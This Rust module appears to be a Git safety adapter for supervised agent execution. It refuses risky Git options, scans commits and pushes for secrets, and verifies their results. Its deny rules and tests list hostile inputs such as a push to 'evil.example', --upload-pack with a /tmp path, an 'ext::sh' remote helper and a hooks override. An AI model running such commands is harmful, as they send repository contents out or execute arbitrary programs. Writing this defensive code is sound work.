//! The Git adapter: structured parsing of Git argument vectors, the repository state an
//! operation depends on, secret scans of what a commit or push would publish, and
//! verification of what actually happened.
//!
//! **Parsing.** Options that select another repository or configuration (`-C`, `-c`,
//! `--git-dir`, `--work-tree`, `--exec-path`, ...) are refused, as are subcommands this adapter
//! does not know (they may be aliases that run anything). `commit` must record exactly the
//! staged index (no `-a`, pathspecs or interactive staging) with a message given on the command
//! line; `push` must name a configured remote and exactly one refspec. Options that make Git run
//! other programs (`--exec`, `--upload-pack`, `--receive-pack`, custom merge strategies,
//! external diff and text conversion) are refused.
//!
//! **Inspection.** Repository state is read with Git plumbing commands that never run hooks,
//! file-system monitors, pagers, external diff or text conversion programs, and never take
//! optional locks. The repository's own configuration is otherwise honoured (as Git would),
//! which is why the working-tree status is skipped when the configuration defines content
//! filters: computing status could run them.
//!
//! **Binding.** HEAD, the current branch, the staged tree, the commits a push would send, the
//! remote's URL identity and every ref an operation names are bound into the operation digest,
//! so an approval cannot authorize a different branch, remote, source or staged content.

use std::path::{Path, PathBuf};
use std::time::Duration;

use agentguard_secrets::{inspect_text, DetectorSet, Evidence};
use serde::Serialize;
use sha2::{Digest, Sha256};

use crate::process::{self, Spawn, Termination};

/// Most commits a push scan inspects; beyond this the scan is incomplete.
pub const MAX_PUSH_COMMITS: usize = 200;
/// Most diff output a scan reads.
pub const MAX_SCAN_BYTES: usize = 16 * 1024 * 1024;
/// Most status or staged entries reported.
pub const MAX_LISTED: usize = 200;

/// Why a Git command is outside what managed execution supports.
#[derive(Debug, Clone, PartialEq, Eq, thiserror::Error)]
#[error("unsupported Git usage: {0}")]
pub struct Unsupported(pub &'static str);

/// What a Git command does.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize)]
#[serde(rename_all = "kebab-case")]
pub enum GitKind {
    /// Inspects the repository.
    ReadOnly,
    /// Records a commit from the staged index.
    Commit,
    /// Sends a ref to a remote.
    Push,
    /// Any other supported change (branches, merges, resets, stashes, remotes, ...).
    Change,
}

/// A parsed push.
#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
pub struct PushSpec {
    /// Configured remote name.
    pub remote: String,
    /// Source ref, absent for a deletion.
    pub src: Option<String>,
    /// Destination ref name on the remote.
    pub dst: String,
    /// `--force`, `--force-with-lease` or a `+` refspec.
    pub forced: bool,
    /// The remote ref is deleted.
    pub delete: bool,
    /// `--dry-run`.
    pub dry_run: bool,
}

/// A parsed Git command.
#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
pub struct GitCommand {
    /// The subcommand.
    pub subcommand: String,
    /// What it does.
    pub kind: GitKind,
    /// For pushes.
    pub push: Option<PushSpec>,
    /// Positional arguments (refs, names, paths), bounded.
    pub positionals: Vec<String>,
}

const GLOBAL_OK: &[&str] = &[
    "--no-pager",
    "-P",
    "--no-optional-locks",
    "--no-replace-objects",
];

const READ_ONLY: &[&str] = &[
    "status",
    "diff",
    "log",
    "show",
    "blame",
    "annotate",
    "shortlog",
    "describe",
    "rev-parse",
    "rev-list",
    "ls-files",
    "ls-tree",
    "cat-file",
    "grep",
    "whatchanged",
    "merge-base",
    "name-rev",
    "show-ref",
    "for-each-ref",
    "count-objects",
    "help",
    "version",
    "show-branch",
    "cherry",
    "range-diff",
    "diff-tree",
    "diff-index",
    "diff-files",
];

const CHANGES: &[&str] = &[
    "add",
    "branch",
    "switch",
    "checkout",
    "merge",
    "rebase",
    "cherry-pick",
    "revert",
    "reset",
    "stash",
    "tag",
    "remote",
    "restore",
    "rm",
    "mv",
    "fetch",
    "pull",
    "clean",
    "config",
];

const BRANCH_LIST: &[&str] = &[
    "-a",
    "-r",
    "--list",
    "-l",
    "-v",
    "-vv",
    "--all",
    "--remotes",
    "--show-current",
    "--merged",
    "--no-merged",
    "--contains",
    "--no-contains",
    "--color",
    "--no-color",
    "--column",
    "--no-column",
];

const BUILTIN_STRATEGIES: &[&str] = &["ort", "recursive", "resolve", "octopus", "ours", "subtree"];

fn name_like(s: &str) -> bool {
    !s.is_empty()
        && !s.starts_with('-')
        && s.len() <= 255
        && s.chars()
            .all(|c| c.is_ascii_alphanumeric() || matches!(c, '-' | '_' | '.' | '/'))
        && !s.contains("..")
}

fn runs_programs(rest: &[&str]) -> bool {
    rest.iter().any(|a| {
        a.starts_with("--exec")
            || a.contains("upload-pack")
            || a.contains("receive-pack")
            || a.starts_with("--ext-diff")
            || a.starts_with("--textconv")
            || a.starts_with("--output")
    })
}

fn parse_commit(rest: &[&str]) -> Result<(), Unsupported> {
    let mut message = false;
    let mut amend = false;
    let mut no_edit = false;
    let mut i = 0;
    while let Some(a) = rest.get(i).copied() {
        match a {
            "-m" | "--message" | "-F" | "--file" => {
                if rest.get(i + 1).is_none() {
                    return Err(Unsupported("commit: an option is missing its value"));
                }
                message = true;
                i += 1;
            }
            "--author" | "--date" | "--cleanup" | "--trailer" => i += 1,
            "-s" | "--signoff" | "--no-signoff" | "--no-verify" | "-n" | "--verify" | "-S"
            | "--no-gpg-sign" | "--allow-empty" | "--allow-empty-message" | "-q" | "--quiet" => {}
            "--amend" => amend = true,
            "--no-edit" => no_edit = true,
            a if a.starts_with("-m") || a.starts_with("--message=") || a.starts_with("--file=") => {
                message = true;
            }
            a if a.starts_with("--author=")
                || a.starts_with("--date=")
                || a.starts_with("--cleanup=")
                || a.starts_with("--trailer=")
                || a.starts_with("--gpg-sign")
                || a.starts_with("-S") => {}
            a if a.starts_with('-') => {
                return Err(Unsupported(
                    "commit: only the staged index can be committed in managed mode (no -a, -i, -o, -p, pathspecs or editor options); stage changes with `git add` first",
                ))
            }
            _ => {
                return Err(Unsupported(
                    "commit: pathspecs are not supported in managed mode; stage changes with `git add` first",
                ))
            }
        }
        i += 1;
    }
    if !(message || amend && no_edit) {
        return Err(Unsupported(
            "commit: give the message with -m (or --amend --no-edit); managed execution never opens an editor",
        ));
    }
    Ok(())
}

fn parse_push(rest: &[&str]) -> Result<PushSpec, Unsupported> {
    let mut forced = false;
    let mut delete = false;
    let mut dry_run = false;
    let mut positionals = Vec::new();
    for a in rest {
        match *a {
            "-f" | "--force" => forced = true,
            "-d" | "--delete" => delete = true,
            "-n" | "--dry-run" => dry_run = true,
            "-u" | "--set-upstream" | "--no-verify" | "--verify" | "-q" | "--quiet" | "-v"
            | "--verbose" | "--atomic" | "--no-atomic" | "--progress" | "--no-progress"
            | "--force-if-includes" | "--no-force-if-includes" => {}
            a if a.starts_with("--force-with-lease") => forced = true,
            a if a.starts_with('-') => {
                return Err(Unsupported(
                    "push: only -f, --force-with-lease, -u, -d, -n, -q, -v, --atomic and --no-verify are supported in managed mode",
                ))
            }
            a => positionals.push(a),
        }
    }
    let [remote, refspec] = positionals.as_slice() else {
        return Err(Unsupported(
            "push: name the remote and exactly one branch (`git push origin feature-a`)",
        ));
    };
    if !name_like(remote) || remote.contains('/') {
        return Err(Unsupported(
            "push: the remote must be a configured remote name, not a URL",
        ));
    }
    let (plus, spec) = match refspec.strip_prefix('+') {
        Some(s) => (true, s),
        None => (false, *refspec),
    };
    let (src, dst) = match spec.split_once(':') {
        Some(("", dst)) => (None, dst),
        Some((src, dst)) => (Some(src), dst),
        None => (Some(spec), spec),
    };
    let src = if delete {
        if src.is_some() && spec.contains(':') {
            return Err(Unsupported(
                "push: --delete takes a branch name, not a refspec",
            ));
        }
        None
    } else {
        src
    };
    if src.is_some_and(|s| !name_like(s)) || !name_like(dst) {
        return Err(Unsupported(
            "push: the refspec must name branches literally",
        ));
    }
    let delete = delete || src.is_none();
    Ok(PushSpec {
        remote: (*remote).to_owned(),
        src: src.map(str::to_owned),
        dst: dst.trim_start_matches("refs/heads/").to_owned(),
        forced: forced || plus,
        delete,
        dry_run,
    })
}

fn read_only_form(sub: &str, rest: &[&str]) -> bool {
    let first = rest.first().copied();
    match sub {
        "branch" => {
            rest.iter().all(|a| {
                BRANCH_LIST.contains(a) || a.starts_with("--sort=") || a.starts_with("--format=")
            }) || rest.iter().any(|a| *a == "--list" || *a == "-l")
        }
        "tag" => rest.is_empty() || rest.iter().any(|a| matches!(*a, "-l" | "--list")),
        "remote" => matches!(first, None | Some("-v" | "--verbose" | "show" | "get-url")),
        "stash" => matches!(first, Some("list" | "show")),
        "config" => rest
            .iter()
            .any(|a| matches!(*a, "--get" | "--get-all" | "--get-regexp" | "--list" | "-l")),
        "reflog" => matches!(first, None | Some("show")),
        _ => false,
    }
}

/// Parse a Git argument vector (`argv[0]` is the program).
pub fn parse(argv: &[String]) -> Result<GitCommand, Unsupported> {
    let mut i = 1;
    while let Some(a) = argv.get(i) {
        if !a.starts_with('-') {
            break;
        }
        if !GLOBAL_OK.contains(&a.as_str()) {
            return Err(Unsupported(
                "options that select another repository or configuration (-C, -c, --git-dir, --work-tree, --exec-path, ...) are not supported in managed mode",
            ));
        }
        i += 1;
    }
    let sub = argv
        .get(i)
        .ok_or(Unsupported("no Git subcommand"))?
        .as_str();
    let rest: Vec<&str> = argv.iter().skip(i + 1).map(String::as_str).collect();
    if runs_programs(&rest) {
        return Err(Unsupported(
            "options that make Git run other programs or write arbitrary files (--exec, --upload-pack, --receive-pack, --ext-diff, --textconv, --output) are not supported",
        ));
    }
    if sub == "grep"
        && rest
            .iter()
            .any(|a| a.starts_with("-O") || a.starts_with("--open-files-in-pager"))
    {
        return Err(Unsupported("grep: --open-files-in-pager runs a program"));
    }
    let positionals: Vec<String> = rest
        .iter()
        .filter(|a| !a.starts_with('-'))
        .take(8)
        .map(|a| (*a).to_owned())
        .collect();
    let kind = if READ_ONLY.contains(&sub) || read_only_form(sub, &rest) {
        GitKind::ReadOnly
    } else if sub == "commit" {
        parse_commit(&rest)?;
        GitKind::Commit
    } else if sub == "push" {
        let push = parse_push(&rest)?;
        return Ok(GitCommand {
            subcommand: sub.to_owned(),
            kind: GitKind::Push,
            push: Some(push),
            positionals,
        });
    } else if CHANGES.contains(&sub) {
        if sub == "rebase"
            && rest
                .iter()
                .any(|a| matches!(*a, "-i" | "--interactive" | "-x"))
        {
            return Err(Unsupported(
                "rebase: interactive rebases and --exec are not supported in managed mode",
            ));
        }
        if matches!(sub, "merge" | "pull" | "rebase") {
            let strategy = rest.iter().enumerate().find_map(|(n, a)| {
                if *a == "-s" || *a == "--strategy" {
                    Some(rest.get(n + 1).copied().unwrap_or_default())
                } else {
                    a.strip_prefix("--strategy=")
                }
            });
            if strategy.is_some_and(|s| !BUILTIN_STRATEGIES.contains(&s)) {
                return Err(Unsupported("custom merge strategies run external programs"));
            }
        }
        if matches!(sub, "fetch" | "pull")
            && positionals
                .first()
                .is_some_and(|r| !name_like(r) || r.contains('/'))
        {
            return Err(Unsupported(
                "fetch/pull: name a configured remote, not a URL",
            ));
        }
        if sub == "remote" && matches!(rest.first(), Some(&("add" | "set-url"))) {
            let url = rest
                .iter()
                .rev()
                .find(|a| !a.starts_with('-'))
                .copied()
                .unwrap_or_default();
            if url.starts_with("ext::") || url.starts_with("fd::") {
                return Err(Unsupported(
                    "remote helpers that run commands (ext::, fd::) are not supported",
                ));
            }
        }
        GitKind::Change
    } else {
        return Err(Unsupported(
            "this Git subcommand is not supported in managed mode (unknown subcommands may be aliases that run arbitrary programs)",
        ));
    };
    Ok(GitCommand {
        subcommand: sub.to_owned(),
        kind,
        push: None,
        positionals,
    })
}

// ---------------------------------------------------------------------------------------------
// Inspection
// ---------------------------------------------------------------------------------------------

/// Runs Git plumbing for inspection: hooks, file-system monitors, pagers and optional locks
/// disabled, no inherited environment, standard input closed, bounded time and output.
#[derive(Debug, Clone)]
pub struct Plumbing {
    git: PathBuf,
    cwd: PathBuf,
    env: Vec<(String, String)>,
}

const PLUMBING_PREFIX: &[&str] = &[
    "-c",
    "core.fsmonitor=false",
    "-c",
    "core.hooksPath=/dev/null",
    "-c",
    "core.pager=cat",
    "-c",
    "credential.helper=",
    "--no-pager",
];

impl Plumbing {
    /// A runner for `git` in `cwd`.
    #[must_use]
    pub fn new(git: &Path, cwd: &Path, path: &[PathBuf], home: Option<&str>) -> Self {
        let mut env = vec![
            (
                "PATH".to_owned(),
                path.iter()
                    .map(|p| p.to_string_lossy().into_owned())
                    .collect::<Vec<_>>()
                    .join(":"),
            ),
            ("LANG".to_owned(), "C".to_owned()),
            ("LC_ALL".to_owned(), "C".to_owned()),
            ("GIT_TERMINAL_PROMPT".to_owned(), "0".to_owned()),
            ("GIT_OPTIONAL_LOCKS".to_owned(), "0".to_owned()),
        ];
        if let Some(h) = home {
            env.push(("HOME".to_owned(), h.to_owned()));
        }
        Self {
            git: git.to_path_buf(),
            cwd: cwd.to_path_buf(),
            env,
        }
    }

    fn run_limited(&self, args: &[&str], limit: usize) -> Option<(String, bool)> {
        let mut full: Vec<String> = PLUMBING_PREFIX.iter().map(|s| (*s).to_owned()).collect();
        full.extend(args.iter().map(|s| (*s).to_owned()));
        let r = process::run(&Spawn {
            program: &self.git,
            arg0: "git",
            args: &full,
            cwd: &self.cwd,
            env: &self.env,
            timeout: Duration::from_secs(30),
            capture_limit: limit,
            signals: None,
        });
        match r.termination {
            Termination::Exited { code: 0 } => Some((
                String::from_utf8_lossy(&r.stdout.bytes).into_owned(),
                r.stdout.truncated(),
            )),
            _ => None,
        }
    }

    /// Stdout of a successful command, trimmed; `None` on failure.
    #[must_use]
    pub fn output(&self, args: &[&str]) -> Option<String> {
        self.run_limited(args, 1024 * 1024)
            .map(|(s, _)| s.trim_end().to_owned())
    }

    fn commit(&self, rev: &str) -> Option<String> {
        let spec = format!("{rev}^{{commit}}");
        self.output(&[
            "rev-parse",
            "--verify",
            "--quiet",
            "--end-of-options",
            &spec,
        ])
        .filter(|s| s.len() >= 40 && s.bytes().all(|b| b.is_ascii_hexdigit()))
    }
}

/// A configured remote, credentials removed.
#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
pub struct Remote {
    /// Name.
    pub name: String,
    /// Push URL without user information, query or fragment.
    pub url: String,
    /// SHA-256 of that URL (first 16 hex characters).
    pub identity: String,
}

/// One status or staged entry.
#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
pub struct Entry {
    /// Porcelain status code.
    pub status: String,
    /// Path relative to the repository root.
    pub path: String,
}

/// Working-tree status.
#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
pub struct Status {
    /// Entries, at most [`MAX_LISTED`].
    pub entries: Vec<Entry>,
    /// Total entries.
    pub total: usize,
}

/// The state of a repository.
#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
pub struct GitContext {
    /// Working-tree root.
    pub root: PathBuf,
    /// Git directory.
    pub git_dir: PathBuf,
    /// Whether both lie inside the registered project.
    pub inside_project: bool,
    /// Short identity: SHA-256 over the root, the common Git directory and the root commits.
    pub repository_id: String,
    /// Current branch (`None` when detached or unborn).
    pub branch: Option<String>,
    /// HEAD commit (`None` in an empty repository).
    pub head: Option<String>,
    /// Tree of the staged index (`None` with unresolved conflicts).
    pub staged_tree: Option<String>,
    /// Staged changes, at most [`MAX_LISTED`].
    pub staged: Vec<Entry>,
    /// Total staged changes.
    pub staged_total: usize,
    /// Remotes.
    pub remotes: Vec<Remote>,
    /// Working-tree status, when computed.
    pub status: Option<Status>,
    /// Why status was not computed.
    pub status_skipped: Option<&'static str>,
    /// Executable hooks present (they run during commits, merges and pushes).
    pub hooks: Vec<String>,
}

/// Remove user information, query and fragment from a remote URL.
#[must_use]
pub fn redact_url(url: &str) -> String {
    if let Some((scheme, rest)) = url.split_once("://") {
        let rest = rest.split(['?', '#']).next().unwrap_or_default();
        let (authority, path) = rest.split_once('/').map_or((rest, ""), |(a, p)| (a, p));
        let host = authority.rsplit_once('@').map_or(authority, |(_, h)| h);
        return if path.is_empty() {
            format!("{scheme}://{host}")
        } else {
            format!("{scheme}://{host}/{path}")
        };
    }
    // scp-like `user@host:path`
    match url.split_once(':') {
        Some((authority, path)) if !authority.contains('/') => {
            let host = authority.rsplit_once('@').map_or(authority, |(_, h)| h);
            format!("{host}:{path}")
        }
        _ => url.to_owned(),
    }
}

fn short_hash(text: &str) -> String {
    hex::encode(Sha256::digest(text.as_bytes()))
        .get(..16)
        .unwrap_or_default()
        .to_owned()
}

fn parse_name_status(text: &str) -> (Vec<Entry>, usize) {
    let mut entries = Vec::new();
    let mut total = 0;
    let mut fields = text.split('\0').filter(|f| !f.is_empty());
    while let Some(status) = fields.next() {
        let Some(path) = fields.next() else { break };
        total += 1;
        if entries.len() < MAX_LISTED {
            entries.push(Entry {
                status: status.to_owned(),
                path: path.to_owned(),
            });
        }
    }
    (entries, total)
}

fn parse_porcelain(text: &str) -> Status {
    let mut entries = Vec::new();
    let mut total = 0;
    let mut records = text.split('\0').filter(|r| !r.is_empty());
    while let Some(record) = records.next() {
        let (status, path) = record.split_at(record.len().min(3));
        let status = status.trim().to_owned();
        // A rename or copy carries its original path as the next record.
        if status.starts_with('R') || status.starts_with('C') {
            records.next();
        }
        total += 1;
        if entries.len() < MAX_LISTED {
            entries.push(Entry {
                status,
                path: path.to_owned(),
            });
        }
    }
    Status { entries, total }
}

impl GitContext {
    /// Inspect the repository containing the plumbing runner's directory. `None` when it is
    /// not inside a Git working tree.
    #[must_use]
    pub fn inspect(p: &Plumbing, project_root: &Path, with_status: bool) -> Option<Self> {
        let top = p.output(&["rev-parse", "--show-toplevel"])?;
        let git_dir = p.output(&["rev-parse", "--absolute-git-dir"])?;
        let common = p
            .output(&["rev-parse", "--git-common-dir"])
            .unwrap_or_else(|| git_dir.clone());
        let root = std::fs::canonicalize(&top).ok()?;
        let git_dir = std::fs::canonicalize(&git_dir).ok()?;
        let inside_project = root.starts_with(project_root) && git_dir.starts_with(project_root);
        let head = p.commit("HEAD");
        let roots = head
            .as_ref()
            .and_then(|_| p.output(&["rev-list", "--max-parents=0", "--max-count=8", "HEAD"]))
            .unwrap_or_default();
        let repository_id = short_hash(&format!(
            "{}\0{}\0{}",
            root.display(),
            std::fs::canonicalize(root.join(&common))
                .unwrap_or_else(|_| git_dir.clone())
                .display(),
            roots
        ));
        let branch = p.output(&["symbolic-ref", "--quiet", "--short", "HEAD"]);
        let staged_tree = p
            .output(&["write-tree"])
            .filter(|s| s.bytes().all(|b| b.is_ascii_hexdigit()) && s.len() >= 40);
        let (staged, staged_total) = p
            .run_limited(
                &[
                    "diff",
                    "--cached",
                    "--name-status",
                    "--no-renames",
                    "-z",
                    "--no-ext-diff",
                ],
                4 * 1024 * 1024,
            )
            .map(|(s, _)| parse_name_status(&s))
            .unwrap_or_default();
        let remotes = p
            .output(&["remote"])
            .unwrap_or_default()
            .lines()
            .take(32)
            .filter(|n| name_like(n))
            .map(|name| {
                let url = p
                    .output(&["remote", "get-url", "--push", name])
                    .map(|u| redact_url(&u))
                    .unwrap_or_default();
                Remote {
                    name: name.to_owned(),
                    identity: short_hash(&url),
                    url,
                }
            })
            .collect();
        let filters = p
            .output(&[
                "config",
                "--name-only",
                "--get-regexp",
                r"^filter\..*\.(clean|smudge|process)$",
            ])
            .is_some_and(|s| !s.is_empty());
        let (status, status_skipped) = if !with_status {
            (None, None)
        } else if filters {
            (
                None,
                Some("the repository configures content filters, which computing status could run"),
            )
        } else {
            match p.run_limited(
                &[
                    "status",
                    "--porcelain=v1",
                    "-z",
                    "--untracked-files=normal",
                    "--ignore-submodules=all",
                ],
                4 * 1024 * 1024,
            ) {
                Some((s, _)) => (Some(parse_porcelain(&s)), None),
                None => (None, Some("git status failed")),
            }
        };
        let hooks_dir = p
            .output(&["rev-parse", "--git-path", "hooks"])
            .map(|h| root.join(h));
        let mut hooks: Vec<String> = hooks_dir
            .and_then(|d| std::fs::read_dir(d).ok())
            .into_iter()
            .flatten()
            .flatten()
            .filter(|e| {
                use std::os::unix::fs::PermissionsExt;
                let name = e.file_name().to_string_lossy().into_owned();
                !name.ends_with(".sample")
                    && e.metadata()
                        .is_ok_and(|m| m.is_file() && m.permissions().mode() & 0o111 != 0)
            })
            .map(|e| e.file_name().to_string_lossy().into_owned())
            .take(32)
            .collect();
        hooks.sort();
        Some(Self {
            root,
            git_dir,
            inside_project,
            repository_id,
            branch,
            head,
            staged_tree,
            staged,
            staged_total,
            remotes,
            status,
            status_skipped,
            hooks,
        })
    }

    /// The remote named `name`.
    #[must_use]
    pub fn remote(&self, name: &str) -> Option<&Remote> {
        self.remotes.iter().find(|r| r.name == name)
    }
}

// ---------------------------------------------------------------------------------------------
// Binding facts, scans and verification
// ---------------------------------------------------------------------------------------------

/// What a push would send, observed now.
#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
pub struct PushContext {
    /// Commit at the source ref (absent for a deletion).
    pub source_commit: Option<String>,
    /// Current remote-tracking commit for the destination, if known locally.
    pub remote_tracking: Option<String>,
    /// Commits not yet on any remote-tracking ref of the remote, newest first, bounded.
    pub commits: Vec<String>,
    /// More commits exist than were listed.
    pub commits_truncated: bool,
}

/// Facts about the refs a command names: `(argument, commit)` for those that resolve.
#[must_use]
pub fn resolve_refs(p: &Plumbing, positionals: &[String]) -> Vec<(String, String)> {
    positionals
        .iter()
        .filter_map(|a| p.commit(a).map(|c| (a.clone(), c)))
        .collect()
}

/// Observe what `push` would send.
#[must_use]
pub fn push_context(p: &Plumbing, push: &PushSpec) -> PushContext {
    let source_commit = push.src.as_deref().and_then(|s| p.commit(s));
    let remote_tracking = p.commit(&format!("refs/remotes/{}/{}", push.remote, push.dst));
    let (commits, commits_truncated) = match &source_commit {
        Some(c) => {
            let max = format!("--max-count={}", MAX_PUSH_COMMITS + 1);
            let not = format!("--remotes={}", push.remote);
            let list = p
                .output(&["rev-list", &max, c, "--not", &not])
                .unwrap_or_default();
            let mut commits: Vec<String> = list.lines().map(str::to_owned).collect();
            let truncated = commits.len() > MAX_PUSH_COMMITS;
            commits.truncate(MAX_PUSH_COMMITS);
            (commits, truncated)
        }
        None => (Vec::new(), false),
    };
    PushContext {
        source_commit,
        remote_tracking,
        commits,
        commits_truncated,
    }
}

/// SHA-256 over a commit list.
#[must_use]
pub fn range_digest(commits: &[String]) -> String {
    hex::encode(Sha256::digest(commits.join("\n").as_bytes()))
}

/// What a pre-execution scan found.
#[derive(Debug, Clone, Copy, Default, PartialEq, Eq, Serialize)]
pub struct ScanResult {
    /// Detected secrets (counts and severity only).
    #[serde(skip)]
    pub evidence: Evidence,
    /// Number of detections.
    pub detections: usize,
    /// Added lines inspected.
    pub lines: u64,
    /// Something could not be inspected.
    pub incomplete: bool,
}

fn scan_added(diff: &str, truncated: bool, detectors: &DetectorSet) -> ScanResult {
    let mut evidence = Evidence::default();
    let mut lines = 0u64;
    let mut chunk = String::new();
    let flush = |chunk: &mut String, evidence: &mut Evidence| {
        if !chunk.is_empty() {
            evidence.merge(&inspect_text(chunk, detectors).evidence);
            chunk.clear();
        }
    };
    let mut binary = false;
    for line in diff.lines() {
        if line.starts_with("Binary files ") || line.starts_with("GIT binary patch") {
            binary = true;
        }
        if let Some(added) = line.strip_prefix('+') {
            if line.starts_with("+++ ") {
                continue;
            }
            lines += 1;
            chunk.push_str(added);
            chunk.push('\n');
            if chunk.len() > 512 * 1024 {
                flush(&mut chunk, &mut evidence);
            }
        }
    }
    flush(&mut chunk, &mut evidence);
    ScanResult {
        detections: evidence.count,
        evidence,
        lines,
        incomplete: truncated || binary,
    }
}

const DIFF_FLAGS: &[&str] = &[
    "--no-color",
    "--no-ext-diff",
    "--no-textconv",
    "--unified=0",
    "--no-renames",
];

/// Scan the staged changes a commit would record.
#[must_use]
pub fn scan_staged(p: &Plumbing, detectors: &DetectorSet) -> ScanResult {
    let mut args = vec!["diff", "--cached"];
    args.extend_from_slice(DIFF_FLAGS);
    match p.run_limited(&args, MAX_SCAN_BYTES) {
        Some((diff, truncated)) => scan_added(&diff, truncated, detectors),
        None => ScanResult {
            incomplete: true,
            ..ScanResult::default()
        },
    }
}

/// Scan the changes in the commits a push would send.
#[must_use]
pub fn scan_push(
    p: &Plumbing,
    push: &PushSpec,
    ctx: &PushContext,
    detectors: &DetectorSet,
) -> ScanResult {
    let Some(source) = &ctx.source_commit else {
        return ScanResult::default();
    };
    if ctx.commits.is_empty() {
        return ScanResult {
            incomplete: ctx.commits_truncated,
            ..ScanResult::default()
        };
    }
    let max = format!("--max-count={MAX_PUSH_COMMITS}");
    let not = format!("--remotes={}", push.remote);
    let mut args = vec!["log", "-p", "--format=commit %H", &max];
    args.extend_from_slice(DIFF_FLAGS);
    args.extend_from_slice(&[source.as_str(), "--not", not.as_str()]);
    match p.run_limited(&args, MAX_SCAN_BYTES) {
        Some((diff, truncated)) => {
            let mut r = scan_added(&diff, truncated, detectors);
            r.incomplete |= ctx.commits_truncated;
            r
        }
        None => ScanResult {
            incomplete: true,
            ..ScanResult::default()
        },
    }
}

/// Whether a completed operation did what was approved.
#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
#[serde(rename_all = "kebab-case", tag = "status", content = "detail")]
pub enum Verification {
    /// Confirmed.
    Verified(String),
    /// The result differs from what was approved.
    Mismatch(String),
    /// Could not be confirmed either way.
    Unconfirmed(String),
    /// Nothing to verify for this operation.
    NotApplicable,
}

/// Verify a commit: the new HEAD records exactly the approved staged tree.
#[must_use]
pub fn verify_commit(
    p: &Plumbing,
    approved_tree: Option<&str>,
    old_head: Option<&str>,
) -> Verification {
    let new_head = p.commit("HEAD");
    let tree = p.output(&["rev-parse", "--verify", "--quiet", "HEAD^{tree}"]);
    match (approved_tree, new_head.as_deref(), tree.as_deref()) {
        (_, None, _) | (_, _, None) => Verification::Unconfirmed("HEAD could not be read".into()),
        (_, Some(h), _) if Some(h) == old_head => {
            Verification::Unconfirmed("no new commit was recorded".into())
        }
        (Some(approved), Some(_), Some(t)) if approved == t => {
            Verification::Verified("the new commit records exactly the approved staged tree".into())
        }
        (Some(_), Some(_), Some(_)) => Verification::Mismatch(
            "the new commit records a different tree than the one approved (a hook may have changed the staged content)".into(),
        ),
        (None, _, _) => Verification::Unconfirmed("no staged tree was bound".into()),
    }
}

/// Verify a push: the remote-tracking ref now points at the pushed commit.
#[must_use]
pub fn verify_push(p: &Plumbing, push: &PushSpec, ctx: &PushContext) -> Verification {
    if push.dry_run {
        return Verification::NotApplicable;
    }
    let tracking = p.commit(&format!("refs/remotes/{}/{}", push.remote, push.dst));
    match (&ctx.source_commit, tracking) {
        (None, None) => Verification::Verified("the remote-tracking ref is gone".into()),
        (Some(src), Some(t)) if *src == t => {
            Verification::Verified("the remote-tracking ref points at the pushed commit".into())
        }
        (Some(_), Some(_)) => Verification::Mismatch(
            "the remote-tracking ref points at a different commit than the one approved".into(),
        ),
        _ => Verification::Unconfirmed("the remote-tracking ref was not updated".into()),
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn p(cmd: &str) -> Result<GitCommand, Unsupported> {
        let argv: Vec<String> = cmd.split(' ').map(str::to_owned).collect();
        parse(&argv)
    }

    #[test]
    fn read_only_forms() {
        for cmd in [
            "git status",
            "git diff HEAD",
            "git log --oneline -5",
            "git show HEAD",
            "git branch --list",
            "git branch -a",
            "git remote -v",
            "git rev-parse HEAD",
            "git tag -l",
            "git stash list",
            "git config --get user.name",
            "git --no-pager log",
        ] {
            assert_eq!(p(cmd).unwrap().kind, GitKind::ReadOnly, "{cmd}");
        }
    }

    #[test]
    fn changes_commits_and_pushes() {
        for cmd in [
            "git branch feature-b",
            "git switch main",
            "git checkout -b x",
            "git merge feature-a",
            "git rebase main",
            "git cherry-pick abc123",
            "git reset --hard HEAD~1",
            "git stash pop",
            "git tag v1",
            "git remote add up https://example.invalid/r.git",
            "git add src",
            "git fetch origin",
        ] {
            assert_eq!(p(cmd).unwrap().kind, GitKind::Change, "{cmd}");
        }
        assert_eq!(p("git commit -m msg").unwrap().kind, GitKind::Commit);
        assert_eq!(
            p("git commit --amend --no-edit").unwrap().kind,
            GitKind::Commit
        );
        let push = p("git push origin feature-a").unwrap().push.unwrap();
        assert_eq!(
            (
                push.remote.as_str(),
                push.src.as_deref(),
                push.dst.as_str(),
                push.forced,
                push.delete
            ),
            ("origin", Some("feature-a"), "feature-a", false, false)
        );
        let forced = p("git push --force-with-lease origin +local:remote")
            .unwrap()
            .push
            .unwrap();
        assert!(forced.forced);
        assert_eq!(
            (forced.src.as_deref(), forced.dst.as_str()),
            (Some("local"), "remote")
        );
        let delete = p("git push origin :old").unwrap().push.unwrap();
        assert!(delete.delete && delete.src.is_none());
        assert!(
            p("git push --delete origin old")
                .unwrap()
                .push
                .unwrap()
                .delete
        );
    }

    #[test]
    fn unsupported_usage_is_refused() {
        for cmd in [
            "git -C /elsewhere status",
            "git -c core.hooksPath=/tmp/x commit -m x",
            "git --git-dir=/x status",
            "git --exec-path=/tmp status",
            "git co main",
            "git filter-branch --all",
            "git commit -a -m x",
            "git commit -m x src/main.rs",
            "git commit",
            "git commit --interactive",
            "git push",
            "git push origin",
            "git push origin a b",
            "git push --all origin",
            "git push --mirror origin",
            "git push --tags origin main",
            "git push https://evil.example/r.git main",
            "git push --receive-pack=/tmp/x origin main",
            "git fetch --upload-pack=/tmp/x origin",
            "git fetch https://evil.example/r.git",
            "git rebase -i main",
            "git rebase --exec=make main",
            "git merge -s evil x",
            "git diff --output=/tmp/x",
            "git diff --ext-diff",
            "git grep -Ovim x",
            "git remote add x ext::sh",
        ] {
            assert!(p(cmd).is_err(), "{cmd}");
        }
    }

    #[test]
    fn urls_lose_credentials() {
        assert_eq!(
            redact_url("https://user:ghp_FAKEfakeFAKEfake@github.com/org/repo.git?x=1"),
            "https://github.com/org/repo.git"
        );
        assert_eq!(
            redact_url("git@github.com:org/repo.git"),
            "github.com:org/repo.git"
        );
        assert_eq!(redact_url("/srv/git/repo.git"), "/srv/git/repo.git");
        assert_eq!(redact_url("ssh://git@host:22/r"), "ssh://host:22/r");
    }
}
